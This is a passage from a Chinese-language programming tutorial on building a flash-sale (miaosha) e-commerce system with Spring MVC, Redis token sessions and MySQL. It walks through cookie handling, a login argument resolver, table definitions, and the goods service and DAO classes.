class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/goods&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GoodsController</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Logger log = LoggerFactory.getLogger(GoodsController.class);<br><br>    <span class="hljs-meta">@Autowired</span><br>    MiaoshaUserService userService;<br><br><br>    <span class="hljs-meta">@RequestMapping(&quot;/to_list&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toLogin</span><span class="hljs-params">(Model model,</span></span><br><span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@CookieValue(value = MiaoshaUserService.COOKIE_NAME_TOKEN,required = false)</span>String cookieToken,</span></span><br><span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@RequestParam(value = MiaoshaUserService.COOKIE_NAME_TOKEN,required = false)</span>String paramToken)</span></span>&#123;<br>        <span class="hljs-comment">//从cookie或请求参数中取出cookie值</span><br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(cookieToken))&#123;<br>            <span class="hljs-comment">//判断若取出的cookie值都为空返回login</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>        String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken;<br>        <span class="hljs-comment">//根据token取值</span><br>        MiaoshaUser user = userService.getByToken(token);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;goods_list&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在MiaoshaUserService中编写getByToken方法（根据token取出session值）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaUser <span class="hljs-title">getByToken</span><span class="hljs-params">(String token)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(token))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> redisService.get(MiaoshaUserKey.token,token,MiaoshaUser.class);<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>其中MiaoshaUserKey：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaUserKey</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BasePrefix</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> TOKEN_EXPIRE = <span class="hljs-number">3600</span> * <span class="hljs-number">24</span> * <span class="hljs-number">2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">MiaoshaUserKey</span><span class="hljs-params">(String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(prefix);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">MiaoshaUserKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> expireSeconds,String prefix)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(expireSeconds, prefix);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MiaoshaUserKey token = <span class="hljs-keyword">new</span> MiaoshaUserKey(TOKEN_EXPIRE,<span class="hljs-string">&quot;tk&quot;</span>);<br><span class="hljs-comment">//    public static MiaoshaUserKey getByName = new MiaoshaUserKey(&quot;name&quot;);</span><br>&#125;<br></code></pre></td></tr></table></figure><p>现在仍然有一些问题，因为cookie的有效期是在登录时设置的，但有效期应该在最后一次访问时得到更新，即我们最后一次访问时如果cookie验证通过应该视为一次登录并使有效期得到延长。</p><p>因此我们在上述进行getByToken方法中查询后更新一次cookie</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaUser <span class="hljs-title">getByToken</span><span class="hljs-params">(HttpServletResponse response,String token)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(token))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        MiaoshaUser user = redisService.get(MiaoshaUserKey.token,token,MiaoshaUser.class);<br>        <span class="hljs-comment">//延长有效期</span><br>        <span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>)&#123;<br>            addCookie(user,response);<br>        &#125;<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br></code></pre></td></tr></table></figure><p>还可以继续优化，因为我们现在访问商品界面需要验证token，访问订单页面也需要验证token，这造成了代码的重复，因此我们定义拦截器统一验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebMvcConfigurerAdapter</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    UserArgumentResolver userArgumentResolver;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addArgumentResolvers</span><span class="hljs-params">(List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers)</span> </span>&#123;<br>        argumentResolvers.add(userArgumentResolver);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写UserArgumentResolver,这会根据当前请求中的cookie与redis中的token对比查询一个user对象并添加到request中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerMethodArgumentResolver</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    MiaoshaUserService userService;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> </span>&#123;<br>        Class&lt;?&gt; clazz = parameter.getParameterType();<br>        <span class="hljs-keyword">return</span> clazz == MiaoshaUser.class;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, ModelAndViewContainer mavContainer, NativeWebRequest webRequest, WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        HttpServletRequest request = webRequest.getNativeRequest(HttpServletRequest.class);<br>        HttpServletResponse response = webRequest.getNativeResponse(HttpServletResponse.class);<br><br><br>        String paramToken = request.getParameter(MiaoshaUserService.COOKIE_NAME_TOKEN);<br>        String cookieToken = getCookieValue(request,MiaoshaUserService.COOKIE_NAME_TOKEN);<br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken;<br>        <span class="hljs-keyword">return</span> userService.getByToken(response,token);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">getCookieValue</span><span class="hljs-params">(HttpServletRequest request, String cookieName)</span> </span>&#123;<br>        Cookie[] cookies = request.getCookies();<br>        <span class="hljs-keyword">for</span> (Cookie cookie: cookies) &#123;<br>            <span class="hljs-keyword">if</span> (cookie.getName().equals(cookieName))&#123;<br>                <span class="hljs-keyword">return</span> cookie.getValue();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>改变GoodsController逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/to_list&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">list</span><span class="hljs-params">(Model model,MiaoshaUser user)</span></span>&#123;<br>        <span class="hljs-comment">//拦截器已经给请求中添加了user，所以可以接收到</span><br>        <br><span class="hljs-comment">//        if (StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(cookieToken))&#123;</span><br><span class="hljs-comment">//            return &quot;login&quot;;</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//        String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken;</span><br><span class="hljs-comment">//        MiaoshaUser user = userService.getByToken(response,token);</span><br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;goods_list&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在编写拦截器中发现bug，其原因是登录时无法正确的设置cookie，拦截器无法debug，但可以通过sout输出相关信息，发现bug不在拦截器中，而发生在addCookie()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCookie</span><span class="hljs-params">(String token,MiaoshaUser user,HttpServletResponse response)</span></span>&#123;<br>        redisService.set(MiaoshaUserKey.token,token,user);<br>        Cookie cookie = <span class="hljs-keyword">new</span> Cookie(COOKIE_NAME_TOKEN, token);<br>        <span class="hljs-comment">//原来expireSeconds默认设置为0，设置为0将立即删除cookie</span><br>        cookie.setMaxAge(<span class="hljs-number">3600</span> * <span class="hljs-number">12</span>);<br><span class="hljs-comment">//        cookie.setMaxAge(MiaoshaUserKey.token.expireSeconds());</span><br>        <span class="hljs-comment">//设置多应用共享</span><br>        cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-comment">//使用response把生成的cookie值传回浏览器</span><br>        response.addCookie(cookie);<br>    &#125;<br></code></pre></td></tr></table></figure><p>原文档中说expireSeconds是永不过期，这是错误的，在redis中expireSeconds为0将立即删除数据，即存活时间为0，redis中不设置过期时间就是永不过期，但我们修改了逻辑使expireSeconds为0永不过期：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> seconds = prefix.expireSeconds();<br><span class="hljs-keyword">if</span> (seconds &lt;= <span class="hljs-number">0</span>) &#123;<br>jedis.set(realkey, str);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>jedis.setex(realkey, seconds, str);<br>&#125;<br></code></pre></td></tr></table></figure><p>此时我们向浏览器设置cookie也使用的cookie.setMaxAge(MiaoshaUserKey.token.expireSeconds());，这不是redis逻辑，而是向浏览器的·response中返回逻辑，此时setMaxAge设置为0将立即删除cookie，即代码出现了redis存入数据，但浏览器中没有的情况。</p><h1 id="3-实现秒杀功能"><a href="#3-实现秒杀功能" class="headerlink" title="3. 实现秒杀功能"></a>3. 实现秒杀功能</h1><h2 id="3-1-数据库设计"><a href="#3-1-数据库设计" class="headerlink" title="3.1 数据库设计"></a>3.1 数据库设计</h2><h3 id="3-1-1-商品表"><a href="#3-1-1-商品表" class="headerlink" title="3.1.1 商品表"></a>3.1.1 商品表</h3><p>商品表goods</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `goods` (<br>  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;商品ID&#x27;</span>,<br>  `goods_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;商品名称&#x27;</span>,<br>  `goods_title` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;商品标题&#x27;</span>,<br>  `goods_img` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;商品的图片&#x27;</span>,<br>  `goods_detail` longtext COMMENT <span class="hljs-string">&#x27;商品的详情介绍&#x27;</span>,<br>  `goods_price` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0.00&#x27;</span> COMMENT <span class="hljs-string">&#x27;商品单价&#x27;</span>,<br>  `goods_stock` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;商品库存，-1表示没有限制&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">5</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure><h3 id="3-1-2-订单表"><a href="#3-1-2-订单表" class="headerlink" title="3.1.2 订单表"></a>3.1.2 订单表</h3><p>订单表order_info</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `order_info` (<br>  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `user_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;用户ID&#x27;</span>,<br>  `goods_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;商品ID&#x27;</span>,<br>  `delivery_addr_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;收获地址ID&#x27;</span>,<br>  `goods_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;冗余过来的商品名称&#x27;</span>,<br>  `goods_count` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;商品数量&#x27;</span>,<br>  `goods_price` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0.00&#x27;</span> COMMENT <span class="hljs-string">&#x27;商品单价&#x27;</span>,<br>  `order_channel` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;1pc，2android，3ios&#x27;</span>,<br>  `status` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;订单状态，0新建未支付，1已支付，2已发货，3已收货，4已退款，5已完成&#x27;</span>,<br>  `create_date` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;订单的创建时间&#x27;</span>,<br>  `pay_date` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;支付时间&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">1565</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure><h3 id="3-1-3-秒杀商品表"><a href="#3-1-3-秒杀商品表" class="headerlink" title="3.1.3 秒杀商品表"></a>3.1.3 秒杀商品表</h3><p>秒杀商品表miaosha_goods，这里不和商品表goods集成的原因是不同的活动秒杀数据不同，如果和goods在一起需要不断的维护goods表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `miaosha_goods` (<br>  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;秒杀的商品表&#x27;</span>,<br>  `goods_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;商品Id&#x27;</span>,<br>  `miaosha_price` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0.00&#x27;</span> COMMENT <span class="hljs-string">&#x27;秒杀价&#x27;</span>,<br>  `stock_count` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;库存数量&#x27;</span>,<br>  `start_date` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;秒杀开始时间&#x27;</span>,<br>  `end_date` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;秒杀结束时间&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">5</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure><h3 id="3-1-4-秒杀订单表"><a href="#3-1-4-秒杀订单表" class="headerlink" title="3.1.4 秒杀订单表"></a>3.1.4 秒杀订单表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `miaosha_order` (<br>  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `user_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;用户ID&#x27;</span>,<br>  `order_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;订单ID&#x27;</span>,<br>  `goods_id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;商品ID&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `u_uid_gid` (`user_id`,`goods_id`) <span class="hljs-keyword">USING</span> BTREE<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">1551</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure><h2 id="3-2-商品列表页"><a href="#3-2-商品列表页" class="headerlink" title="3.2 商品列表页"></a>3.2 商品列表页</h2><p>编写Goods实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Goods</span> </span>&#123;<br>    <span class="hljs-comment">//商品表</span><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-keyword">private</span> String goodsName;<br>    <span class="hljs-keyword">private</span> String goodsTitle;<br>    <span class="hljs-keyword">private</span> String goodsImg;<br>    <span class="hljs-keyword">private</span> String goodsDetail;<br>    <span class="hljs-keyword">private</span> String goodsPrice;<br>    <span class="hljs-keyword">private</span> String goodsStock;<br><br>    <span class="hljs-comment">//getter and setter</span><br>   &#125;<br></code></pre></td></tr></table></figure><p>编写MiaoshaGoods实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaGoods</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-keyword">private</span> Long goodsId;<br>    <span class="hljs-keyword">private</span> Integer stockCount;<br>    <span class="hljs-keyword">private</span> Double miaoshaPrice;<br>    <span class="hljs-keyword">private</span> Date startDate;<br>    <span class="hljs-keyword">private</span> Date endDate;<br>    <br>    <span class="hljs-comment">//getter and setter</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>在GoodsController中的to_list添加查询商品列表的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-meta">@RequestMapping(&quot;/to_list&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">list</span><span class="hljs-params">(Model model,MiaoshaUser user)</span></span>&#123;<br><span class="hljs-comment">//        if (StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(cookieToken))&#123;</span><br><span class="hljs-comment">//            return &quot;login&quot;;</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//        String token = StringUtils.isEmpty(paramToken) ? cookieToken : paramToken;</span><br><span class="hljs-comment">//        MiaoshaUser user = userService.getByToken(response,token);</span><br><br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-comment">//查询商品列表</span><br>        List&lt;GoodsVo&gt; goodsList = goodsService.listGoodsVo();<br>        model.addAttribute(<span class="hljs-string">&quot;goodsList&quot;</span>,goodsList);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;goods_list&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>编写GoodsService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GoodsService</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    GoodsDao goodsDao;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;GoodsVo&gt; <span class="hljs-title">listGoodsVo</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> goodsDao.listGoodsVo();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>编写GoodsDao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">GoodsDao</span> </span>&#123;<br><br>    <span class="hljs-meta">@Select(&quot;select g.*,mg.stock_count,mg.start_date,mg.end_date,mg.miaosha_price from miaosha_goods mg left join goods g on mg.goods_id = g.id&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> 